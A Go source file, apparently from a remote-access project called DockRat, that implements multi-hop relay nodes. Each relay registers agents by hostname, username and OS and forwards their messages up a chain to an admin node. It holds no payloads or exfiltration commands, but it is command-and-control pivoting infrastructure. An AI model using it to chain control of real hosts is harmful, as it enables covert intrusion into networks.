package network

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"

	"github.com/Singert/DockRat/core/common"
	"github.com/Singert/DockRat/core/node"
	"github.com/Singert/DockRat/core/protocol"
)

// RelayContext 持有当前 relay 节点的所有状态
type RelayContext struct {
	SelfID      int                 // 当前 relay 节点的 ID
	Registry    *node.Registry      // 当前 relay 节点的注册表
	IDAllocator *common.IDAllocator // ID 分配器
	Upstream    net.Conn            // 与上级节点或 admin 的连接
}

// 初始化 RelayContext
func NewRelayContext(selfID int, idStart, idCount int, upstream net.Conn) *RelayContext {
	return &RelayContext{
		SelfID:   selfID,
		Registry: node.NewRegistry(),

		IDAllocator: common.NewIDAllocator(idStart, idCount),
		Upstream:    upstream,
	}
}

// RelayRouter 负责转发和处理与 relay 相关的消息
type RelayRouter struct {
	registry    *node.Registry
	idAllocator *common.IDAllocator
	upstream    net.Conn // 与 Admin 的连接
}

// 初始化 RelayRouter
func NewRelayRouter(registry *node.Registry, idAllocator *common.IDAllocator, upstream net.Conn) *RelayRouter {
	return &RelayRouter{
		registry:    registry,
		idAllocator: idAllocator,
		upstream:    upstream,
	}
}

// 统一处理消息的路由
func (r *RelayRouter) HandleRelayPacket(pkt protocol.RelayPacket) error {
	var msg protocol.Message
	err := json.Unmarshal(pkt.Data, &msg)
	if err != nil {
		return fmt.Errorf("failed to unmarshal relay packet: %v", err)
	}

	// 根据目的ID路由
	if pkt.DestID == -1 {
		return r.forwardToAdmin(msg) // 向 admin 上报
	}

	return r.forwardToRelay(msg, pkt.DestID) // 向下转发
}

// 转发消息到 admin
func (r *RelayRouter) forwardToAdmin(msg protocol.Message) error {
	buf, err := protocol.EncodeMessage(msg)
	if err != nil {
		return fmt.Errorf("failed to encode message for admin: %v", err)
	}
	_, err = r.upstream.Write(buf)
	return err
}

// 转发消息到下游 Relay
func (r *RelayRouter) forwardToRelay(msg protocol.Message, destID int) error {
	parentID := r.registry.NodeGraph.GetParent(destID)
	if parentID == -1 {
		return fmt.Errorf("no parent found for destID %d", destID)
	}

	parentNode, ok := r.registry.Get(parentID)
	if !ok || parentNode.Conn == nil {
		return fmt.Errorf("no connection found for parent node %d", parentID)
	}

	buf, err := protocol.EncodeMessage(msg)
	if err != nil {
		return fmt.Errorf("failed to encode message for relay: %v", err)
	}

	_, err = parentNode.Conn.Write(buf)
	return err
}

// 处理 relay 连接并注册节点
func HandleRelayConnection(conn net.Conn, ctx *RelayContext) {
	log.Printf("[Relay %d] New connection from %s", ctx.SelfID, conn.RemoteAddr())

	// 读取消息长度与内容（与 handleConnection 一致）
	lengthBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lengthBuf); err != nil {
		log.Println("[-] Read length failed:", err)
		conn.Close()
		return
	}
	length := bytesToUint32(lengthBuf)
	data := make([]byte, length)
	if _, err := io.ReadFull(conn, data); err != nil {
		log.Println("[-] Read payload failed:", err)
		conn.Close()
		return
	}

	msg, err := protocol.DecodeMessage(data)
	if err != nil || msg.Type != protocol.MsgHandshake {
		log.Println("[-] Invalid or non-handshake message")
		conn.Close()
		return
	}

	var payload protocol.HandshakePayload
	if err := json.Unmarshal(msg.Payload, &payload); err != nil {
		log.Println("[-] Handshake decode failed:", err)
		conn.Close()
		return
	}

	// 分配 ID
	newID, err := ctx.IDAllocator.Next()
	if err != nil {
		log.Println("[-] No available ID for new node")
		conn.Close()
		return
	}

	n := &node.Node{
		ID:       newID,
		Conn:     conn,
		Hostname: payload.Hostname,
		Username: payload.Username,
		OS:       payload.OS,
		Addr:     conn.RemoteAddr().String(),
	}

	ctx.Registry.AddWithID(n)
	ctx.Registry.NodeGraph.SetParent(n.ID, ctx.SelfID)
	log.Printf("[Relay %d] Registered child ID %d (%s@%s)", ctx.SelfID, n.ID, n.Username, n.Hostname)

	// 上报给 admin
	liteNode := &node.Node{
		ID:       newID,
		Hostname: payload.Hostname,
		Username: payload.Username,
		OS:       payload.OS,
		Addr:     conn.RemoteAddr().String(),
	}
	report := protocol.RelayRegisterPayload{
		ParentID: ctx.SelfID,
		Node:     *liteNode,
	}
	reportBytes, _ := json.Marshal(report)
	msgOut := protocol.Message{
		Type:    protocol.MsgRelayRegister,
		Payload: reportBytes,
	}

	// 判断是否向 admin 上报（ID -1 表示 admin）
	switch ctx.SelfID {
	case -1:
		// 不应该发生：RelayContext 不应为 -1
		log.Println("[-] Invalid SelfID == -1 in relay")
	case 0:
		// relay0 → admin（直接连接）
		buf, _ := protocol.EncodeMessage(msgOut)
		ctx.Upstream.Write(buf)
	default:
		// relayN → relayX → ... → admin（封装为 RelayPacket 向上）
		inner, _ := json.Marshal(msgOut)
		pkt := protocol.RelayPacket{
			DestID: -1, // admin ID 统一约定为 -1
			Data:   inner,
		}
		pktBytes, _ := json.Marshal(pkt)
		wrapped := protocol.Message{
			Type:    protocol.MsgRelayPacket,
			Payload: pktBytes,
		}
		buf, _ := protocol.EncodeMessage(wrapped)
		ctx.Upstream.Write(buf)
	}

	// 启动消息读取
	go HandleRelayAgentMessages(n, ctx)
	select {}
}

// 处理 relay 节点上报的消息
func HandleRelayAgentMessages(n *node.Node, ctx *RelayContext) {
	conn := n.Conn
	for {
		lengthBuf := make([]byte, 4)
		if _, err := io.ReadFull(conn, lengthBuf); err != nil {
			log.Printf("[Relay] Node %d disconnected: %v", n.ID, err)
			ctx.Registry.Remove(n.ID)
			ctx.Registry.NodeGraph.RemoveNode(n.ID) // 从拓扑中移除
			ctx.IDAllocator.Free(n.ID)
			conn.Close()
			return
		}
		length := bytesToUint32(lengthBuf)
		data := make([]byte, length)
		if _, err := io.ReadFull(conn, data); err != nil {
			log.Printf("[Relay] Node %d read failed: %v", n.ID, err)
			ctx.Registry.Remove(n.ID)
			ctx.Registry.NodeGraph.RemoveNode(n.ID) // 从拓扑中移除
			ctx.IDAllocator.Free(n.ID)
			conn.Close()
			return
		}

		// 解码消息
		msg, err := protocol.DecodeMessage(data)
		if err != nil {
			log.Printf("[-] Decode inner message failed: %v", err)
			continue
		}
		fmt.Println("Relay received message from node", n.ID, ":", msg)
		innerJson, _ := protocol.EncodeMessage(msg)
		fmt.Printf("[Relay %d] ↑ RelayUpward called for message: Type=%s\n", ctx.SelfID, msg.Type)

		// 构造 RelayPacket 上送
		pkt := protocol.RelayPacket{
			DestID: -1,
			Data:   innerJson,
		}
		pktBytes, _ := json.Marshal(pkt)
		msgOut := protocol.Message{
			Type:    protocol.MsgRelayPacket,
			Payload: pktBytes,
		}
		fmt.Println("Relay sending packet to admin:", pkt)
		out, _ := protocol.EncodeMessage(msgOut)
		ctx.Upstream.Write(out)
	}
}

// 启动 relay 监听器
func StartRelayListener(addr string, ctx *RelayContext) {
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		log.Fatalf("[-] Relay listen failed on %s: %v", addr, err)
	}
	log.Printf("[Relay %d] Listening on %s", ctx.SelfID, addr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Println("[-] Relay accept error:", err)
			continue
		}
		go HandleRelayConnection(conn, ctx)
	}
}
